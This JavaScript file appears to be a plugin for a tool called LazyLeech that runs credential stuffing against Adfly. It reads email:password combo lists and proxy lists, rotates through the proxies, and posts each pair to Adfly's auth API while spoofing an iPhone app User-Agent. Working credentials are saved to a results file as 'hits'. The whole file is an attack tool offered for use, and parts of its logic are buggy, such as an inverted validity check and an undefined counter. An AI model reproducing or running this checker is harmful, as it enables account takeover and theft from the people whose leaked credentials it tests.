"use strict";

// Dependencies
const I2rys = require("../../../utils/i2rys")
const Request = require("request")
const dialogy = require("dialogy")
const path = require("path")
const fs = require("fs")

// Variables
var Adfly = {
    index: 0,
    comboLength: 0,
    results: ""
}

// Main
class Plugin {
    single(baseDir, callback){
        I2rys.log("bloody", "INFO", "LazyLeech Debugger:", "Your combo file path.")
        const comboFile = dialogy.openFile({
            filter: {
                patterns: ["*.txt"],
                description: "TXT File"
            }
        })
    
        I2rys.log("bloody", "INFO", "LazyLeech Debugger:", "Your proxies file path(LazyLeech only accepts HTTP/HTTPS Proxies).")
        const proxiesFile = dialogy.openFile({
            filter: {
                patterns: ["*.txt"],
                description: "Proxies File"
            }
        })
    
        const combo = fs.readFileSync(comboFile, "utf8").split("\n")
        const proxies = fs.readFileSync(proxiesFile, "utf8").split("\n")
    
        Adfly.comboLength = combo.length
        for( const self of combo ){
            if(self){
                const randomProxy = Math.floor(Math.random() * proxies.length-1)
    
                check(self.split(":")[0], self.split(":")[1], proxies, randomProxy)
            }else{
                Adfly.comboLength = combo.length -1
            }
        }
    
        function check(email, password, proxyIndex){
            Request.post(`http://api.ay.gy/v1/auth`, {
                headers: {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "User-Agent": "AdF.ly/1.0.6 (iPhone; iOS 13.5.1; Scale/2.00)"
                },
                ignoreprotocolerrors: true,
                allowautoredirect: true,
                timeout: 5000,
                body: `password=${password}&email=${email}`,
                proxy: `http://${proxies[proxyIndex]}`
            }, function(err, res, body){
                if(err){
                    if(proxyIndex === proxies){
                        proxyIndex = 0
                        return check(email, password, proxyIndex)
                    }
        
                    proxyIndex++
                    return check(email, password, proxyIndex)
                }
    
                if(!body.length || body.indexOf("ERROR:") !== -1){
                    if(proxyIndex === proxies){
                        proxyIndex = 0
                        return check(email, password, proxyIndex)
                    }
        
                    proxyIndex++
                    return check(email, password, proxyIndex)
                }
    
                if(body.indexOf("incorrect.") === -1){
                    I2rys.log("bloody", "INFO", "LazyLeech Debugger:", `${email}:${password} is valid`)
        
                    Adfly.results.length ? Adfly.results = `${email}:${password} is valid` : Adfly.results += `\n${email}:${password} is valid`
                }else{
                    I2rys.log("bloody", "INFO", "LazyLeech Debugger:", `${email}:${password} is invalid`)
                }
        
                Adfly.index++
                if(Adfly.index === Adfly.comboLength){
                    I2rys.log("yellowish", "INFO", "LazyLeech Debugger:", "Combo checking is finished.")
                    I2rys.log("yellowish", "INFO", "LazyLeech Debugger:", "Checking if they are any hits.")
    
                    if(Adfly.results.length == 0){
                        I2rys.log("yellowish", "INFO", "LazyLeech Debugger:", "Looks like they are no hits.")
                        return callback()
                    }else{
                        const randomNumbers = Math.floor(Math.random() * 999999999999)
    
                        I2rys.log("yellowish", "INFO", "LazyLeech Debugger:", `${Adfly.results.split("\n").length} hits found.`)
                        fs.writeFileSync(`${baseDir}/results/adfly_${randomNumbers}.txt`, Adfly.results, "utf8")
                        I2rys.log("yellowish", "INFO", "LazyLeech Debugger:", `The results have been saved to ${baseDir}/results/adfly_${randomNumbers}.txt`)
                    }

                    return callback()
                }
    
                return
            })
        }
    }

    all(resultsDir, combo, proxies, callback){
        Adfly.comboLength = combo.length
        for( let i in combo ){
            if(combo[i] != ""){
                const random_proxy_index = Math.floor(Math.random() * proxies.length-1)
    
                check(combo[i].split(":")[0], combo[i].split(":")[1], proxies, random_proxy_index)
            }else{
                Adfly.comboLength = combo.length -1
            }
        }
    
        function check(email, password, proxy_index){
            var body = { grant_type: "password", "username": email, "password": password }
            body = JSON.stringify(body)
    
            Request.post(`http://api.ay.gy/v1/auth`, {
                headers: {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "User-Agent": "AdF.ly/1.0.6 (iPhone; iOS 13.5.1; Scale/2.00)"
                },
                ignoreprotocolerrors: true,
                allowautoredirect: true,
                timeout: 5000,
                body: `password=${password}&email=${email}`,
                proxy: `http://${proxies[proxy_index]}`
            }, function(err, res, body){
                if(err){
                    if(proxy_index == proxies){
                        proxy_index = 0
                        check(email, password, proxy_index)
                        return
                    }
        
                    proxy_index++
                    check(email, password, proxy_index)
                    return
                }
    
                if(body.length == 0 || body.indexOf("ERROR:") != -1){
                    if(proxy_index == proxies){
                        proxy_index = 0
                        check(email, password, proxy_index)
                        return
                    }
        
                    proxy_index++
                    check(email, password, proxy_index)
                    return
                }
        
                if(body.indexOf("incorrect.") != -1){
                    I2rys.log("bloody", "INFO", "LazyLeech Debugger:", `[Adfly] ${email}:${password} is valid`)
        
                    if(Adfly.results.length == 0){
                        Adfly.results = `[Adfly] ${email}:${password} is valid`
                    }else{
                        Adfly.results += `\n[Adfly] ${email}:${password} is valid`
                    }
                }else{
                    I2rys.log("bloody", "INFO", "LazyLeech Debugger:", `[Adfly] ${email}:${password} is invalid`)
                }
        
                Adfly.emailpass_index++
                if(Adfly.emailpass_index == Adfly.comboLength){
                    I2rys.log("yellowish", "INFO", "LazyLeech Debugger:", "[Adfly] Combo checking is finished.")
                    I2rys.log("yellowish", "INFO", "LazyLeech Debugger:", "[Adfly] Checking if they are any hits.")
    
                    if(Adfly.results.length == 0){
                        I2rys.log("yellowish", "INFO", "LazyLeech Debugger:", "[Adfly] Looks like they are no hits.")
                        return
                    }else{
                        const randomNumbers = Math.floor(Math.random() * 999999999999)
    
                        I2rys.log("yellowish", "INFO", "LazyLeech Debugger:", `[Adfly] ${Adfly.results.split("\n").length} hits found.`)
                        fs.writeFileSync(`${resultsDir}/adfly_${randomNumbers}.txt`, Adfly.results, "utf8")
                        I2rys.log("yellowish", "INFO", "LazyLeech Debugger:", `[Adfly] The results have been saved to ${resultsDir}/adfly_${randomNumbers}.txt`)
                    }
                    return
                }
    
                return
            })
        }
    }
}

module.exports = Plugin